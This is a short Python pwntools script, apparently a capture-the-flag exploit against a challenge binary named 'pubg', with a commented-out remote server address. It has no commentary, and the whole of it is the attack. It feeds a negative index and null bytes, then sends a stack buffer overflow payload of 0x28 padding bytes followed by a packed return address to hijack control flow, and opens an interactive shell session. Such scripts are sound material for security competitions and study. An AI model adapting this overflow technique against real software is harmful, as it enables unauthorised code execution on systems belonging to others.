from pwn import *
import time
import hashlib
context.log_level='debug'
p=process('./pubg')
#p=remote('159.65.68.241',9001)
p.recvuntil('code')
p.sendline('2')
p.recvuntil(':')
p.sendline('-2')
time.sleep(5)
p.close()

p=process('./pubg')
#p=remote('159.65.68.241',9001)
p.recvuntil('code')
p.sendline('2')
p.recvuntil(':')
p.sendline('-1')
p.recvuntil(':')
p.send('\x00'*16)
p.recvuntil(':')
p.send('A'*0x28+p64(0x401BED))
p.interactive()
